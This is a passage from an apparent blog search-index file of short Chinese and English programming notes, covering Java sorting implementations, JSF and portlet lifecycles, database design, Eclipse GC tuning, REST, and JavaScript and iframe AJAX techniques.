tSystem.arraycopy(array, from, temporary, 0, middle-from+1);      t        tfor(int i=0;i&lt;to-middle;i++) {              t        t ttemporary[to-from-i]=array[middle+i+1];          t        t}          t        t  t        twhile(k&lt;to-from+1) {            t        t  if(temporary[leftIndex].compareTo(temporary[rightIndex])&lt;0) {    t        t     array[k+from]=temporary[leftIndex++];                t        t  } else {                  t        t   t array[k+from]=temporary[rightIndex--];            t          }              t           t          k++;          t          }               }    }      七 堆排序 堆是一种完全二叉树，一般使用数组来实现。 堆主要有两种核心操作，    * 从指定节点向上调整(shiftUp)  * 从指定节点向下调整(shiftDown)  建堆，以及删除堆定节点使用shiftDwon,而在插入节点时一般结合两种操作一起使用。 堆排序借助最大值堆来实现，第i次从堆顶移除最大值放到数组的倒数第i个位置，然后shiftDown到倒数第i+1个位置,一共执行N此调整，即完成排序。 显然，堆排序也是一种选择性的排序，每次选择第i大的元素。  package algorithms;      public class HeapSorter&lt;E extends Comparable&lt;E&gt;&gt; extends Sorter&lt;E&gt;  {          @Override          public void sort(E[] array, int from, int len) {              build_heap(array,from,len);                      for(int i=0;i&lt;len;i++) {             t//swap max value to the (len-i)-th position               tswap(array,from,from+len-1-i);               tshift_down(array,from,len-1-i,0);//always shiftDown from 0              }          }                      private final void build_heap(E[] array, int from, int len) {              int pos=(len-1)/2;//we start from (len-1)/2, because branch's node +1=leaf's node, and all leaf node is already a heap                  for(int i=pos;i&gt;=0;i--)         {                  shift_down(array,from,len,i);                  }            }                 private final void shift_down(E[] array,int from, int len, int pos){       t tE tmp=array[from+pos];               t tint index=pos*2+1;//use left child       t twhile(index&lt;len)//until no child  {       t  if(index+1&lt;len&amp;&amp;array[from+index].compareTo(array[from+index+1])&lt;0)//right child is bigger             {       t t t index+=1;//switch to right child                  t  t}                   t  t t t    tif(tmp.compareTo(array[from+index])&lt;0)             {    t t t     tarray[from+pos]=array[from+index];                  t t t     pos=index;                  t t t      tindex=pos*2+1;                t t t   }  else {                  t t t      tbreak;              t t t   }             t t t}                t tarray[from+pos]=tmp;           t}      }    八 桶式排序 桶式排序不再是基于比较的了，它和基数排序同属于分配类的排序，这类排序的特点是事先要知道待排序列的一些特征。 桶式排序事先要知道待排序列在一个范围内，而且这个范围应该不是很大的。 比如知道待排序列在[0,M）内，那么可以分配M个桶，第I个桶记录I的出现情况，最后根据每个桶收到的位置信息把数据输出成有序的形式。 这里我们用两个临时性数组，一个用于记录位置信息，一个用于方便输出数据成有序方式，另外我们假设数据落在0到MAX,如果所给数据不是从0开始，你可以把每个数减去最小的数.   package algorithms; public class BucketSorter {   t tpublic void sort(int[] keys,int from,int len,int max)     {           t tint[] temp = new int[len];           t tint[] count = new int[max];                 t tfor(int i=0;i&lt;len;i++)         {               t t tcount[keys[from+i]]++;           t t}             t t//calculate position info           t tfor(int i=1; i&lt;max; i++)         {               t t tcount[i]=count[i]+count[i-1];//this means how many number which is less or equals than i,thus it is also position + 1            t t}               t tSystem.arraycopy(keys, from, temp, 0, len);             t tfor(int k=len-1; k&gt;=0; k--)//from the ending to beginning can keep the stability         {               t t tkeys[--count[temp[k]]] = temp[k];// position +1 =count           t t}       t}       t      tpublic static void main(String[] args) {             t tint[] a= {1,4,8,3,2,9,5,0,7,6,9,10,9,13,14,15,11,12,17,16};   t tBucketSorter sorter=new BucketSorter();           t tsorter.sort(a,0,a.length,20);//actually is 18, but 20 will also work   t tfor(int i=0; i&lt;a.length; i++)         {             System.out.print(a[i]+&quot;,&quot;);         }       }   } 九 基数排序 基数排序可以说是扩展了的桶式排序，比如当待排序列在一个很大的范围内，比如0到999999内，那么用桶式排序是很浪费空间的。而基数排序把每个排序码拆成由d个排序码，比如任何一个6位数（不满六位前面补0）拆成6个排序码，分别是个位的，十位的，百位的。。。。 排序时，分6次完成，每次按第i个排序码来排。 一般有两种方式: 高位优先(MSD)： 从高位到低位依次对序列排序 低位优先(LSD)： 从低位到高位依次对序列排序 计算机一般采用低位优先法（人类一般使用高位优先），但是采用低位优先时要确保排序算法的稳定性。 基数排序借助桶式排序，每次按第N位排序时，采用桶式排序。对于如何安排每次落入同一个桶中的数据有两种安排方法： 顺序存储：每次使用桶式排序，放入r个桶中，，相同时增加计数。 链式存储：每个桶通过一个静态队列来跟踪。 package algorithms;   import java.util.Arrays; public class RadixSorter {       public static boolean USE_LINK=true;       public void sort(int[] keys,int from ,int len,int radix, int d)     {         if(USE_LINK)         {             link_radix_sort(keys,from,len,radix,d);                 } else {                      tarray_radix_sort(keys,from,len,radix,d);                 }        }              private final void array_radix_sort(int[] keys, int from, int len, int radix,             int d)      {           t tint[] temporary=new int[len];           t tint[] count=new int[radix];           t tint R=1;             t tfor(int i=0;i&lt;d;i++)         {               t t tSystem.arraycopy(keys, from, temporary, 0, len);     t t tArrays.fill(count, 0);               t t tfor(int k=0;k&lt;len;k++)             {                 t t t   int subkey=(temporary[k]/R)%radix;               t t t   count[subkey]++;               t t t}                 t t for(int j=1;j&lt;radix;j++)             {     t t   count[j]=count[j]+count[j-1];               t t }                   t t for(int m=len-1;m&gt;=0;m--)             {                   t t  t tint subkey=(temporary[m]/R)%radix;                   t t  t t--count[subkey];   t t  t tkeys[from+count[subkey]]=temporary[m];               t t  t}                 t t  tR*=radix;         }       }         private static class LinkQueue     {          tint head=-1;          tint tail=-1;     }     private final void link_radix_sort(int[] keys, int from, int len, int radix, int d) {            tint[] nexts=new int[len];            tLinkQueue[] queues=new LinkQueue[radix];          t  tfor(int i=0;i&amp;lt;radix;i++)         {              t tqueues[i]=new LinkQueue();          t}          t  tfor(int i=0;i&amp;lt;len-1;i++)         {              t tnexts[i]=i+1;          t}          t  tnexts[len-1]=-1;            tint first=0;          tfor(int i=0;i&amp;lt;d;i++)         {  t             tlink_radix_sort_distribute(keys,from,len,radix,i,nexts,queues,first);              t tfirst=link_radix_sort_collect(keys,from,len,radix,i,nexts,queues);         }          t             t  t             t  t int[] tmps=new int[len];          t int k=0;          t while(first!=-1)         {                t  t tmps[k++]=keys[from+first];              t  t first=nexts[first];          t }          t  t System.arraycopy(tmps, 0, keys, from, len);         }     private final void link_radix_sort_distribute(int[] keys, int from, int len,             int radix, int d, int[] nexts, LinkQueue[] queues,int first) {           for(int i=0;i&lt;radix;i++) queues[i].head=queues[i].tail=-1;         while(first!=-1)         {              tint val=keys[from+first];              tfor(int j=0;j&amp;lt;d;j++)val/=radix;              tval=val%radix;              t  tif(queues[val].head==-1)             {    t   queues[val].head=first;              t}  else {                  t tnexts[queues[val].tail]=first;                t}              t  tqueues[val].tail=first;              tfirst=nexts[first];         }       }     private int link_radix_sort_collect(int[] keys, int from, int len,             int radix, int d, int[] nexts, LinkQueue[] queues) {         int first=0;         int last=0;         int fromQueue=0;         for(;(fromQueue&lt;radix-1)&amp;&amp;(queues[fromQueue].head==-1);fromQueue++);         first=queues[fromQueue].head;          t t t tlast=queues[fromQueue].tail;            t t t twhile(fromQueue&lt;radix-1&amp;&amp;queues[fromQueue].head!=-1)         {      fromQueue+=1;                for(;(fromQueue&lt;radix-1)&amp;&amp;(queues[fromQueue].head==-1);fromQueue++);               nexts[last]=queues[fromQueue].head;                last=queues[fromQueue].tail;               }                 if(last!=-1)nexts[last]=-1;             return first;         }       public static void main(String[] args) {          t tint[] a={1,4,8,3,2,9,5,0,7,6,9,10,9,135,14,15,11,222222222,1111111111,12,17,45,16};         USE_LINK=true;          t tRadixSorter sorter=new RadixSorter();          t tsorter.sort(a,0,a.length,10,10);          t tfor(int i=0;i&amp;lt;a.length;i++)         {      t t         System.out.print(a[i]+&amp;quot;,&amp;quot;);          t t}    t t        t}   }   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-8/"
    } ,
  
    {
      "title"    : "portlet lifecycle",
      "category" : "iteye",
      "content": " processAction processEvent render serveResource     ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-80/"
    } ,
  
    {
      "title"    : "session 实现",
      "category" : "iteye",
      "content": "我们知道session 实现有好几种机制，比如cookie, url-rewriting, etc.   When cookie is disabled on client side, most of time we can refer to use response.encodeURL or encodeRedirectURL to add a param jsessionid to identify the client and context. ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-81/"
    } ,
  
    {
      "title"    : "数据库表设计",
      "category" : "iteye",
      "content": "Q: 如何在开发后期修改表结构对现有程序影响最小 表设计是预留一个无任何业务意义的字段，比如userFiled1,userField2,....方便以后与具体业务字段映射 设计一个特殊的字段存放XML文件，XML文件中存放自定义的结构，方便系统扩充。存取是需要解析XML字符串   通过象Hibernate这种物理表结构和对象逻辑结构的映射。修改发生在物理表结构和hibernate mapping 文中   在java类中，用不可变的字符串定义了表名和字段名。如            public const String CUSTOMERS_TABLE = Customers;     public const String EMAIL_FIELD     = Email;     public const String NAME_FIELD      = Name;     这样修改只发生在少量的地方。 Q:如何提高性能 为特殊的业务需求，比如支付平台的reconciliation和settlement，建一张影子表（比如paymentShadow),冗余其他相关表的字段。通过这种手段减少关联查询提高效率。 不设外键甚至主键，这种方式有点像No SQL的方式，但确实在商业应用系统中碰到过。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-82/"
    } ,
  
    {
      "title"    : "CMMI",
      "category" : "iteye",
      "content": "CMMI Maturity Levels: Level-1:  Chaotic, individual heroics   Level-2: Managed processes are planned, documented, monitored, and controlled at the project level   Level-3: Defined  processes are described in standards, procedures, tools and methods   Level-4: Quantitatively Managed Processes are controlled using quantitative techniques   Level-5: Optimizing Continually improving process performance ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-83/"
    } ,
  
    {
      "title"    : "API 层事务策略",
      "category" : "iteye",
      "content": "API Layer 事务策略的命名基于这样一个事实：所有事务逻辑包含在逻辑应用程序架构的 API 层。这个层是一个逻辑层 — 有时也被称为应用程序的域层（domain layer）或 facade 层，它以公共方法或接口的形式向客户机（或表示层）公开功能。之所以说是逻辑 层，是因为可以从本地访问域层（通过直接实例化和调用），或通过 HTTP、远程方法调用（RMI）、通过 EJB 使用 RMI over Internet Inter-Orb Protocol (RMI-IIOP)，甚至通过 Java Message Service (JMS) 进行远程访问。       只有包含在应用程序架构的 API 层中的公共方法包含事务逻辑。其他方法、类或组件都不应包含事务逻辑（包括事务注释、编程式事务逻辑和回滚逻辑）。 API 层中的所有公共写方法（包括插入、更新和删除）都应当使用事务属性 REQUIRED 加以标记。 API层中的所有公共写方法（包括插入、更新和删除）都应当包含回滚逻辑，以标记对检查出的异常执行回滚的事务。 API 层中的所有公共读方法默认情况下都应使用事务属性 SUPPORTS 加以标记     对于 LUW （Logic Unit of Work)请求，应用程序使用 85% 的单 API 层调用和 15% 的多 API 层调用。对于多API层调用解决的方法是使用一个聚合 API 层方法将多个 API 调用重构为一个单一的 API 调用。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-84/"
    } ,
  
    {
      "title"    : "JSF Lifecycle",
      "category" : "iteye",
      "content": "  The life cycle handles both kinds of requests: initial requests and postbacks. When a user makes an initial request for a page, he or she is requesting the page for the first time. When a user executes a postback, he or she submits the form contained on a page that was previously loaded into the browser as a result of executing an initial request. When the life cycle handles an initial request, it only executes the restore view and render response phases because there is no user input or actions to process. Conversely, when the life cycle handles a postback, it executes all of the phases.   Restore View builds the view root and saves to FacesContext, includes event handlers and validators if it is the initial reqeust, empty view created and life cycle advances to render response directly. Apply Request Value component extracts its new value from the request parameters. Type conversion occurs in this phase.   if renderResponse called on FacesContext, skip to the render response phase.    FacesContext.responseComplete can be called, and redirect to a different web app   if immediate set to true, the validation, conversion,events will be processed in the phase.   Process Validations process validators registered on the components. if any error message, the life cycle advances directly to the render response phase.   if FacesContext.renderResponse called, skip to the render response phase   if FacesContext.responseComplete called, redirect to a different web app   Update Model value update component value to manage bean property   similarily for FacesContext.responseComplete similarily for FacesContext.renderResponse   Invoke Application handle application-level events   similarily for FacesContext.responseComplete Render Response if JSP pages used, the components will render themselves as the JSP container traverses the tags in the page.   if this is the initial request, the components represented on the page will be added to the component tree as the JSP container executes the page.   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-85/"
    } ,
  
    {
      "title"    : "JSR168 Portlet related",
      "category" : "iteye",
      "content": " portlet request divide  into action request and render request   Render parameters allow the portlet to store its navigational state. Render parameters stay the same for subsequent render requests and only change when the portlet receives a new action. This enables bookmarkability and solves the browser back button problem. portlet request:  a call from from the client (portal server) to process some information or render some markup.  A portlet request is received and managed by a portlet container. The portlet container executes the targeted portlet to process the request.  There are two things that distinguish portlet requests from typical http (web requests):  the client sending the portlet request is a portal application not an end user (browser) and multiple (two) requests are sent to submit data and render a markup response.   portlet request scope:  the duration of a request processed by the portlet container.  Because portlets separate action processing and rendering in two distinct requests, client state stored in the request scope does not carry forward from a portlet's action to its render.   JSF Bridge As Faces executes in the context of an underlying container its request scope is restricted by that provided by the container.  However, the Faces model is based on the servlet model and hence expects a single request for processing both user interactions and rendering.  Because this isn't the behavior in a portlet container, Faces does not execute properly if the Faces application depends on request scoped data established during action processing and referenced during rendering.     the bridge preserves data stored at request scope so that it can be restored on subsequent render requests.  I.e. where in a regular portlet environment, each action and render request processing starts with an empty data set in its request scope and any data added to this scope during processing is destroyed when the request completes, the bridge preserves this state and restores it into the request scope on subsequent render requests.         ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-86/"
    } ,
  
    {
      "title"    : "Mysql 笔记",
      "category" : "iteye",
      "content": "InnoDB和MyISAM是在使用MySQL最常用的两个表类型，各有优缺点，视具体应用而定。基本的差别为： MyISAM类型不支持事务处理等高级处理，而InnoDB类型支持。 MyISAM类型的表强调的是性能，其执行数度比InnoDB类型更快，但是不提供事务支持，而InnoDB提供事务支持以及外部键等高级数据库功能。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-87/"
    } ,
  
    {
      "title"    : "网站设计",
      "category" : "iteye",
      "content": " 磁盘IO问题，解决方法之一是cache 比如在应用服务器和数据库之间加入memcached.磁盘IO主要原因之一是大量文件读写操作，比如图片，音频，视频的读写。不管是直接从文件还是从数据库，都会造成大量的IO Web Server前（如Apache Server）加入squid(Reverse Proxy) 我是这么理解的：Forward Proxy配在客户浏览器端，如局域网通过这种代理上网Reverse Proxy配在Web Server端，作为cache. 可不可以作为Redirect /load balance 不是很确定。 IBM Edge Server应该属于此类。       ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-88/"
    } ,
  
    {
      "title"    : "数据库设计",
      "category" : "iteye",
      "content": " Sharding(Shared Nothing), 实现scale out的一种方式。其主要目的是为突破单节点数据库服务器的I/O能力限制，解决数据库扩展性问题。适用用业务逻辑上独立的数据，bloger,digger上单个user的数据。Shard可以根据ID,时间段，表来划分。   如果结果涉及多个shard，可以在应用层抽象出一个数据库操作接口，对从多个shard取回的结果进行merge, sort之类的操作。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-89/"
    } ,
  
    {
      "title"    : "Eclipse GC log",
      "category" : "iteye",
      "content": "为了查看Eclipse GC log，需要在eclipse.ini 中加入 -XX:+PrintGCTimeStamps -XX:+PrintGCDetails -verbose:gc -Xloggc:gc.log     在Eclipse安装目录查看gc.log 9.768: [Full GC 9.769: [Tenured: 7678K-&gt;9025K(27328K), 0.3117731 secs] 9172K-&gt;9025K(39616K), [Perm : 16383K-&gt;16383K(16384K)], 0.3122537 secs] 从上面的日志看似有perm 区(16384K)满引起的Full GC, 需要增大perm区空间和初始空间     -XX:PermSize=64m -XX:MaxPermSize=64m     再重启Eclipse有如下log 1.338: [GC 1.338: [DefNew: 10944K-&gt;1028K(12288K), 0.0223470 secs] 10944K-&gt;1028K(39616K), 0.0224436 secs] [Times: user=0.03 sys=0.00, real=0.03 secs]  2.053: [GC 2.053: [DefNew: 11972K-&gt;434K(12288K), 0.0159322 secs] 11972K-&gt;1431K(39616K), 0.0161071 secs] [Times: user=0.01 sys=0.00, real=0.02 secs]  2.923: [GC 2.923: [DefNew: 11378K-&gt;1048K(12288K), 0.0192125 secs] 12375K-&gt;2044K(39616K), 0.0193916 secs]     貌似初始yong 区空间小了引起yong GC，让初始堆空间跟最大堆空间一样大（yong区应该也会按比例增大吧），GC消除了。   最终eclipse.ini如下     -startup plugins/org.eclipse.equinox.launcher_1.1.1.R36x_v20101122_1400.jar --launcher.library plugins/org.eclipse.equinox.launcher.win32.win32.x86_1.1.2.R36x_v20101222 -product org.eclipse.epp.package.java.product --launcher.XXMaxPermSize 256M -showsplash org.eclipse.platform --launcher.defaultAction openFile -vmargs -Dosgi.requiredJavaVersion=1.5 -Xms384m -Xmx384m -XX:PermSize=64m -XX:MaxPermSize=64m -XX:+PrintGCTimeStamps -XX:+PrintGCDetails -verbose:gc -Xloggc:gc.log     有趣的是关掉Eclipse会看到如下的log 20.639: [GC 20.639: [DefNew: 104960K-&gt;12258K(118016K), 0.2109056 secs] 104960K-&gt;12258K(380160K), 0.2110277 secs] [Times: user=0.20 sys=0.00, real=0.20 secs]  31.909: [GC 31.909: [DefNew: 117218K-&gt;7351K(118016K), 0.2577353 secs] 117218K-&gt;19392K(380160K), 0.2578431 secs] [Times: user=0.24 sys=0.00, real=0.25 secs]  Heap  def new generation   total 118016K, used 37344K [0x02b00000, 0x0ab00000, 0x0ab00000)   eden space 104960K,  28% used [0x02b00000, 0x0484a4c0, 0x09180000)   from space 13056K,  56% used [0x09180000, 0x098add90, 0x09e40000)   to   space 13056K,   0% used [0x09e40000, 0x09e40000, 0x0ab00000)   tenured generation   total 262144K, used 12041K [0x0ab00000, 0x1ab00000, 0x1ab00000)     the space 262144K,   4% used [0x0ab00000, 0x0b6c25c0, 0x0b6c2600, 0x1ab00000)   compacting perm gen  total 65536K, used 36982K [0x1ab00000, 0x1eb00000, 0x1eb00000)     the space 65536K,  56% used [0x1ab00000, 0x1cf1d8e0, 0x1cf1da00, 0x1eb00000) No shared spaces configured. 是什么触发了yong GC？关Eclipse时需要创建对象引起GC释放更多的对象？ Yong 区空间118016K + tenured 空间262144K = 380160K, 这约等于我们Xms/Xmx设置的空间。所以xms/xmx大小不包括perm区空间   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-9/"
    } ,
  
    {
      "title"    : "WPS &quot;The URI length is greater than the Windows limit of 259 characters&quot;",
      "category" : "iteye",
      "content": "http://publib.boulder.ibm.com/infocenter/imshelp1/v3r0/index.jsp?topic=/com.ibm.wspac6.doc/satsinst.html Shorten the temp directory used by WebSphere® Portal Server (WPS), following the steps described below:   Create a directory with a short name on the C drive, for example, C:  tmp. Start the WebSphere Portal Server V6.0, and using the WAS Administrative Console, navigate to the servers Application Servers &gt; Portal server(注意此处是portal server， 而不是app server,否则无效) &gt; Java™ and Process Management &gt; Process Definition &gt; Java Virtual Machine page. In the Generic JVM arguments, fill in: -Dworkspace.user.root=C:  tmp Save and re-start the WebSphere Portal Server。When the server restarts, it will then use the C:  tmp directory as the WebSphere Portal Server temp directory. This fixes the problem.   好像IBM有Pack针对这个问题，以上的可以作为一个workaround. 在以下WAS/WPS测试通过。   IBM WebSphere Application Server - ND, 6.0.2.9 Build Number: cf90614.22 Build Date: 4/7/06 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-95/"
    } ,
  
    {
      "title"    : "Date in Java",
      "category" : "iteye",
      "content": "以下两个是同一个时间： UTC, Coordinated Universal Time (UTC)， use time zone of  GMT   GMT, Greenwich Mean Time   标准时间  18:00 GMT = 18:00+00:00 在用java.text.SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ssZ&quot;); 格式化时间时： Z表示的时间格式是+00:00 z表示的时间格式是UTC ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-96/"
    } ,
  
    {
      "title"    : "RESTful 笔记",
      "category" : "iteye",
      "content": "REST（Representational State Transfer）是 Roy Fielding 提出的一个描述互联系统架构风格的名词。   Another way to say REST is in HTTP, any request a client can make involves a URL and an HTTP method. With REST, the URL is designed to represent a noun and the HTTP method always maps to one of several standard verbs, which will be performed against that noun.In summary, each HTTP method will cause a well-defined action on the resource represented by the URL it operates on. The methods can be compared to SQL commands: GET is like &quot;SELECT,&quot; DELETE is like &quot;DELETE,&quot; POST is like &quot;INSERT&quot; with an auto-generated ID, and PUT is like &quot;INSERT OR UPDATE IF EXISTS&quot; with an ID specified.   REST 指的是一组架构约束条件和原则。满足这些约束条件和原则的应用程序或设计就是 RESTful. stateless 有利于scalabilty，cluster 客户端可用cache提高性能   分层 这表示组件无法了解它与之交互的中间层以外的组件，这是博士论文中提到的，不是很理解   Get/Put/Delete方法的幂等性     Security 与SOAP架构相比，REST架构的优点是： SOAP接口隐藏在SOAP　Envelope中了，对外暴露的是相同的URL（对于同一个web service), 不利于代理服务器根据HTTP method做安全控制， 除非解析SOAP Envelope 内容。   SOAP 采用HTTP Post也不利于浏览器做cache ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-97/"
    } ,
  
    {
      "title"    : "Javascript 笔记",
      "category" : "iteye",
      "content": " 正则表达式 //删除开头和结尾所有的空格 function trim(str) {   return str.replace(/(^  s+|  s+$)/g,''); } 注： ^ 开头 $ 结尾   s 空格匹配 + 多次出现      g 全文匹配 i 忽略大小写    setTimeout(message, 3000);  3秒后执行函数message一次，如果要重复执行需要在message函数中再调用setTimeout一次     ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-98/"
    } ,
  
    {
      "title"    : "AJAX学习笔记",
      "category" : "iteye",
      "content": "在用IFrame做Ajax时，需要考虑的有： 先定义隐藏的IFrame &lt;iframe name=myIframe src=blank.html style=width:0px;height:0px frameborder=0&gt; &lt;/iframe&gt; 通过button,Href或者form提交，动态修改IFrame的src属性或者设置Href,Form的Target属性 如何在父窗口和IFrame页面传递数据 Three ways of Moving Data From an iframe to the Parent The iframe page can use it's own javascripts to transfer and place the data into the parent. &lt;script&gt; // - this is the script in the iframe results page var reps = document.getElementById('state_reps').innerHTML; parent.document.getElementById('results1').innerHTML = reps; &lt;/script&gt;     The iframe page can pass its document object as an argument to a function in the parent, thereby allowing the parent to retrieve data from the iframe. &lt;script&gt; // - this is the script in parent page function showReps(doc){  var x = doc.getElementById('state_reps').innerHTML;  document.getElementById('results2').innerHTML = x; } &lt;/script&gt;     Place an onload event handler in the iframe tag in the parent document (this page). This method does not work with Netscape &lt;iframe name=repIframe3 src=blank.html onload=getIframeDoc()&gt;&lt;/iframe&gt;  &lt;script&gt;  function getIframeDoc(){   var iframeDoc = window.frames['repIframe3'].document;   var sr = iframeDoc.getElementById('state_reps');   if (sr){   var reps3 = sr.innerHTML;   document.getElementById('results3').innerHTML = reps3;   }  } &lt;/script&gt;      &lt;script&gt;  // - this is the script in the iframe results page  parent.showReps(document); &lt;/script&gt; ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-99/"
    } ,
  
    {
      "title"    : "类的初始化",
      "category" : "iteye",
      "content": "类的初始化顺序： 静态初始化块 main函数中的输出（调用构造函数前） 实例的初始化块（初始化匿名内部类的地方） 构造函数初始化 import static java.lang.System.out; public class InitializerDemo { public InitializerDemo() { out.println(&quot;in constructor&quot;);   // Fourth } &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;in static initializer&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// First &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;in instance initializer&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Third&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;in main() method&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//second&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;InitializerDemo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; }         ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-150/"
    } ,
  
    {
      "title"    : "Oracle 笔记",
      "category" : "iteye",
      "content": " oracle Hints select  /*+ FIRST_ROWS(100) */  field1, field2,... from ... where ... 上面是Hints, 用于优化，告诉oracle 尽快返回前100行，适用于OLTP。还有ALL_ROWS,告诉Oracle用最少的资源处理所有行并一次返回。   FTS（全表扫描）可以并行，通过设置 DB_FILE_MULTIBLOCK_READ_COUNT 索引扫描不能并行，一般快些。 Oracle 提供了两种优化策略 一种是 Rule-base Optimizer    另一种是Cost-base Optimizer     ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-151/"
    } ,
  
    {
      "title"    : "closures, inner class and 函数指针",
      "category" : "iteye",
      "content": "一直不是很理解这三个感念之间的区别。Java是面向对象的编程语言，这点与现在流行的面向函数的动态编程语言不同。Javascript就是后者的一个例子。函数可以独立于对象存在，（或者说它本身就是一种对象）。   Java里没有函数指针，但可以向函数中传入一个匿名内部类模拟这种行为。   Java目前还未引入closures, 但基于JVM的Groovy已经有Closures概念。在Groovy中，所谓Closures就是一段大括号括起来的代码段。这段代码按照Java的习惯一般只能存在于函数中（初始化代码除外）并以函数名的方式调用。在Groovy中，这段代码可以赋给一个变量，通过这个变量来调用这段代码（很多时候放在大括号中直接匿名使用）。   那么代码段与Closures的区别是什么呢? 代码段一般是虚拟机碰到这段代码时就执行（方法调用，初始化，回调方法）。Closures只有在它的call()方法被调用时才执行。理解的不是很清楚，详细请参考：Closures Informal Guide   闭包有几个特点： 可以访问闭包范围外的变量（这点是不是跟Java中内部类相似？） 可以匿名用在任何允许用闭包的地方，比如Groovy的list的collect, each 调用中 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-152/"
    } ,
  
    {
      "title"    : "checked and unchecked exception",
      "category" : "iteye",
      "content": "checked 和 unchecked exception 的区别，资深一点的Java程序员都知道。这里我感兴趣的是该怎么用checked 和 unchecked exception.   最早的exception处理机制来自C++，在C中为了避免错误，我们会根据返回结果或者判断状态（文件操作）来保证程序的正确性。这样在代码中就会有大量的if/else判断最后甚至让读代码的人忘了程序片段的真正意图。因此C++中引入了exception的处理机制。不过C++为了兼容C,异常处理是选择性的。 Java是真正严格实现异常机制的语言。   从架构的角度什么时候用checked exception，什么时候用unchecked exception, 如何封装，处理，仁者见仁，智者见智。 有种选择是不用checked exception. Think In Java作者Bruce Eckel在Does Java need Checked Exceptions 提到这种设计选择。我的理解是原因有三点： 业务逻辑不愿意恢复的错误，比如Rod Johnson在J2EE Deveopment Without EJB中举了一个Service Locator 中JNDI Lookup failure时直接抛出Un-Checked exception。这样不会逼着系统处理这种异常，比如尝试恢复或者提示用户。 checked exception是编译时异常，强制要求处理，确实降低了程序出错的可能。但有时程序中还是大量充斥这种异常处理的代码。 程序员经常有意无意中丢掉了异常（简单的打印出异常信息，没有思考如何进一步处理），这是程序中引入bug的一种主要来源，并且比较难找。   据说Spring中DAO的封装中都是Runtime Exception. 不知是不是也是基于此考虑。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-153/"
    } ,
  
    {
      "title"    : "Project Human Resource Management",
      "category" : "iteye",
      "content": "The process areas of Human Resource Management are: Develop Human Resource Plan; Acquire Project Team, Develop Project Team and Manage Project Team.   Develop Human Resource Plan Roles &amp; Responsibilities matrix(Responsible, Accountable, Supports, Informed, Consulted), Organization Chart, Staffing Management Plan   Acquire Team Four kinds of &quot;Relationship Styles&quot;: Socializer, Relater, Thinker, Director   Develop Team Situational Leadship Styles: Telling, Selling, Participative, Delegating   Manage Team Virtual Teams     The Death Spiral     Globe Cultural Expectations ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-154/"
    } ,
  
    {
      "title"    : "motto",
      "category" : "iteye",
      "content": " As simple as possible and no simpler -Einstein Life is like a snowball. The important thing is finding wet snow and a really long hill. -Warren Buffett Work expands so as to fill the time available for its completion -Parkinson's Law ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-155/"
    } ,
  
    {
      "title"    : "javascript中==和===的区别",
      "category" : "iteye",
